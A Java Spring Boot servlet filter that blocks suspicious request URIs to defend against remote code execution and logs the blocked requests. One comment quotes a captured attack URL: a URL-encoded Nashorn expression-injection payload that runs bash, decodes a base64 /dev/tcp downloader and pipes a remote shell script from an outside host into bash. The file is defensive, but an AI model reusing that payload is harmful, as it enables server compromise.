package com.server.boot.filter;

import com.server.boot.service.UserService;
import lombok.RequiredArgsConstructor;
import org.springframework.beans.factory.ObjectProvider;
import org.springframework.stereotype.Component;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;

@Component
@RequiredArgsConstructor
/**
 * 불분명한 요청은 서블릿 필터로 톰캣에 들어오기 전 차단
 * */

public class RCEDefenseFilter implements Filter {

    private final ObjectProvider<UserService> userServiceProvider;

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {

        HttpServletRequest httpRequest = (HttpServletRequest)request;
        HttpServletResponse httpResponse = (HttpServletResponse)response;

        String requestURI = httpRequest.getRequestURI();

        //악성코드 > http://158.247.254.218:8090/$%257Bnew%2520javax.script.ScriptEngineManager%2528%2529.getEngineByName%2528%2522nashorn%2522%2529.eval%2528%2522new%2520java.lang.ProcessBuilder%2528%2529.command%2528%2527bash%2527%252C%2527-c%2527%252C%2527echo%2520dnVybCgpIHsKCUlGUz0vIHJlYWQgLXIgcHJvdG8geCBob3N0IHF1ZXJ5IDw8PCIkMSIKICAgIGV4ZWMgMzw%252BIi9kZXYvdGNwLyR7aG9zdH0vJHtQT1JUOi04MH0iCiAgICBlY2hvIC1lbiAiR0VUIC8ke3F1ZXJ5fSBIVFRQLzEuMFxyXG5Ib3N0OiAke2hvc3R9XHJcblxyXG4iID4mMwogICAgKHdoaWxlIHJlYWQgLXIgbDsgZG8gZWNobyA%252BJjIgIiRsIjsgW1sgJGwgPT0gJCdccicgXV0gJiYgYnJlYWs7IGRvbmUgJiYgY2F0ICkgPCYzCiAgICBleGVjIDM%252BJi0KfQp2dXJsIGh0dHA6Ly9iLjktOS04LmNvbS9icnlzai93LnNofGJhc2gK%257Cbase64%2520-d%257Cbash%2527%2529.start%2528%2529%2522%2529%257D/
        /**
         * 필터에서 막히면 요청 로그로 /error만 남는다. (필터에서 걸러도 인터셉터까지 error요청이 간다)
         * 필터보다 더 앞 (톰캣단) 에서 400에러로 막히면 당연히 로그가 남지않음
         *
         * */

        if (requestURI.length() >= 30 || requestURI.matches(".*[';\"].*") ||
                requestURI.contains("!") || //정규식으로하니까 안먹음("/")
                requestURI.contains("@") ||
                requestURI.contains("#") ||
                requestURI.contains("$") ||
                requestURI.contains("%") ||
                requestURI.contains("^") ||
                requestURI.contains("&") ||
                requestURI.contains("*") ||
                requestURI.contains("(") ||
                requestURI.contains(")") ||
                requestURI.contains("<") ||
                requestURI.contains(">") ||
                !requestURI.startsWith("/") ||
                requestURI.equals("/")) {

            httpResponse.sendError(HttpServletResponse.SC_BAD_REQUEST, "Get Out"); //400 Error

            UserService userService = userServiceProvider.getIfAvailable();
            Map<String, String> map = new HashMap<>();

            SimpleDateFormat dateFormatMonthDay = new SimpleDateFormat("MM월 dd일 HH시 mm분");
            Date currentDate = new Date();

            map.put("requestURI", String.valueOf(httpRequest.getRequestURL()));
            map.put("userIp", httpRequest.getRemoteAddr());
            map.put("time", dateFormatMonthDay.format(currentDate));
            map.put("userAgent", httpRequest.getHeader("user-Agent"));

            userService.filterLog(map);
            return;
        }

        chain.doFilter(request, response);
    }

    @Override
    public void destroy() {
        Filter.super.destroy();
    }

}
